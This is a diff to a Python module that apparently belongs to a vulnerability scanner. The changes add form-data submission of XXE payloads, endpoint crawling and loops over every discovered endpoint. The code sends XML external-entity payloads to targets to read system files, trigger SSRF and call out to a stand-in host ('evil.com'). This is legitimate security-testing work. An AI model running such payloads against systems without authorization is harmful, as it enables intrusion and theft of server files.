@@ -8,6 +8,7 @@ Tests for XXE vulnerabilities:
 - SSRF via XXE
 """
 
+import json
 import os
 import time
 import requests
@@ -25,8 +26,10 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
         Dict with test results
     """
     result = {
+        "type": "xxe",
         "test": "xxe_oob",
         "vulnerable": False,
+        "url": target_url,
         "evidence": None,
         "target_url": target_url
     }
@@ -41,22 +44,38 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
 ]>
 <foo>&xxe;</foo>"""
     
-    # Try POST with XML content-type
-    headers = {"Content-Type": "application/xml"}
+    # Method 1: Try POST with form data (common pattern for web forms)
     try:
-        resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
-        # Check response for XXE indicators
+        resp = requests.post(target_url, data={"xml": xxe_payload}, timeout=10)
         if "evil.com" in resp.text or callback_url in resp.text:
             result["vulnerable"] = True
             result["evidence"] = {
                 "response_snippet": resp.text[:500],
                 "status_code": resp.status_code,
-                "note": "XXE entity reference returned in response"
+                "method": "POST_FORM",
+                "note": "XXE entity reference returned in response (form data)"
             }
-    except Exception as e:
+            return result
+    except Exception:
         pass
     
-    # Also try with different content types
+    # Method 2: Try POST with raw XML content-type
+    headers = {"Content-Type": "application/xml"}
+    try:
+        resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
+        if "evil.com" in resp.text or callback_url in resp.text:
+            result["vulnerable"] = True
+            result["evidence"] = {
+                "response_snippet": resp.text[:500],
+                "status_code": resp.status_code,
+                "method": "POST_XML",
+                "note": "XXE entity reference returned in response"
+            }
+            return result
+    except Exception:
+        pass
+    
+    # Method 3: Try other content types
     for content_type in ["text/xml", "application/xml; charset=utf-8"]:
         if result["vulnerable"]:
             break
@@ -69,6 +88,7 @@ def test_xxe_oob(target_url: str, callback_url: Optional[str] = None) -> Dict[st
                     "response_snippet": resp.text[:500],
                     "status_code": resp.status_code,
                     "content_type": content_type,
+                    "method": "POST_XML",
                     "note": "XXE entity reference returned in response"
                 }
         except Exception:
@@ -87,8 +107,10 @@ def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
         Dict with test results
     """
     result = {
+        "type": "xxe",
         "test": "xxe_file_inclusion",
         "vulnerable": False,
+        "url": target_url,
         "evidence": None,
         "target_url": target_url
     }
@@ -109,6 +131,26 @@ def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
 ]>
 <foo>&xxe;</foo>"""
         
+        # Method 1: Try POST with form data
+        try:
+            resp = requests.post(target_url, data={"xml": xxe_payload}, timeout=10)
+            content = resp.text.lower()
+            
+            indicators = ["root:", "localhost", "127.0.0.1", "bin/bash"]
+            if any(ind in content for ind in indicators):
+                result["vulnerable"] = True
+                result["evidence"] = {
+                    "file_path": file_path,
+                    "response_snippet": resp.text[:500],
+                    "status_code": resp.status_code,
+                    "method": "POST_FORM",
+                    "note": "File content detected in response (form data)"
+                }
+                return result
+        except Exception:
+            pass
+        
+        # Method 2: Try POST with raw XML
         headers = {"Content-Type": "application/xml"}
         try:
             resp = requests.post(target_url, data=xxe_payload, headers=headers, timeout=10)
@@ -122,9 +164,10 @@ def test_xxe_file_inclusion(target_url: str) -> Dict[str, Any]:
                     "file_path": file_path,
                     "response_snippet": resp.text[:500],
                     "status_code": resp.status_code,
+                    "method": "POST_XML",
                     "note": "File content detected in response"
                 }
-                break
+                return result
         except Exception:
             pass
     
@@ -142,8 +185,10 @@ def test_xxe_ssrf(target_url: str, callback_url: Optional[str] = None) -> Dict[s
         Dict with test results
     """
     result = {
+        "type": "xxe",
         "test": "xxe_ssrf",
         "vulnerable": False,
+        "url": target_url,
         "evidence": None,
         "target_url": target_url
     }
@@ -177,6 +222,53 @@ def test_xxe_ssrf(target_url: str, callback_url: Optional[str] = None) -> Dict[s
         pass
     
     return result
+
+
+def discover_xxe_endpoints(base_url: str) -> List[str]:
+    """Discover endpoints that might accept XML
+    
+    Args:
+        base_url: Base URL
+        
+    Returns:
+        List of potential XXE endpoints
+    """
+    endpoints = [base_url]
+    
+    # Common XXE-prone endpoints
+    common_endpoints = [
+        "/parse", "/xml", "/api/xml", "/upload",
+        "/import", "/feed", "/rss", "/soap",
+        "/api/import", "/data", "/submit",
+        "/api/parse", "/xmlparser", "/xmlrpc",
+    ]
+    
+    for ep in common_endpoints:
+        endpoints.append(f"{base_url.rstrip('/')}{ep}")
+    
+    # Try to crawl for XML-related links
+    try:
+        resp = requests.get(base_url, timeout=10)
+        if resp.status_code == 200:
+            import re
+            # Find all href links
+            hrefs = re.findall(r'href=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
+            for href in hrefs:
+                if any(kw in href.lower() for kw in ["xml", "parse", "upload", "import", "feed"]):
+                    if href.startswith("/"):
+                        endpoints.append(f"{base_url.rstrip('/')}{href}")
+                    elif href.startswith(base_url):
+                        endpoints.append(href)
+            
+            # Find form actions
+            actions = re.findall(r'action=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
+            for action in actions:
+                if action.startswith("/"):
+                    endpoints.append(f"{base_url.rstrip('/')}{action}")
+    except Exception:
+        pass
+    
+    return list(set(endpoints))
 
 
 def validate_xxe(discovery_data: Dict[str, Any], callback_server_url: Optional[str] = None) -> Dict[str, Any]:
@@ -217,26 +309,34 @@ def validate_xxe(discovery_data: Dict[str, Any], callback_server_url: Optional[s
             print(f"[XXE] Callback setup failed: {e}, continuing without callbacks")
             callback_server_url = None
     
-    # Test OOB XXE
-    oob_result = test_xxe_oob(target, callback_url)
-    results["tests_run"] += 1
-    if oob_result["vulnerable"]:
-        results["vulnerable"] = True
-        results["findings"].append(oob_result)
+    # Discover XXE endpoints
+    endpoints_to_test = discover_xxe_endpoints(target)
+    print(f"[XXE] Testing {len(endpoints_to_test)} endpoints")
     
-    # Test file inclusion
-    file_result = test_xxe_file_inclusion(target)
-    results["tests_run"] += 1
-    if file_result["vulnerable"]:
-        results["vulnerable"] = True
-        results["findings"].append(file_result)
-    
-    # Test SSRF via XXE
-    ssrf_result = test_xxe_ssrf(target, callback_url)
-    results["tests_run"] += 1
-    if ssrf_result["vulnerable"]:
-        results["vulnerable"] = True
-        results["findings"].append(ssrf_result)
+    # Test each endpoint
+    for endpoint_url in endpoints_to_test:
+        # Test OOB XXE
+        oob_result = test_xxe_oob(endpoint_url, callback_url)
+        results["tests_run"] += 1
+        if oob_result["vulnerable"]:
+            results["vulnerable"] = True
+            results["findings"].append(oob_result)
+            continue  # Found vuln on this endpoint, move to next
+        
+        # Test file inclusion
+        file_result = test_xxe_file_inclusion(endpoint_url)
+        results["tests_run"] += 1
+        if file_result["vulnerable"]:
+            results["vulnerable"] = True
+            results["findings"].append(file_result)
+            continue  # Found vuln on this endpoint, move to next
+        
+        # Test SSRF via XXE
+        ssrf_result = test_xxe_ssrf(endpoint_url, callback_url)
+        results["tests_run"] += 1
+        if ssrf_result["vulnerable"]:
+            results["vulnerable"] = True
+            results["findings"].append(ssrf_result)
     
     # Poll for callback hits if callback enabled
     if callback_server_url and correlator:
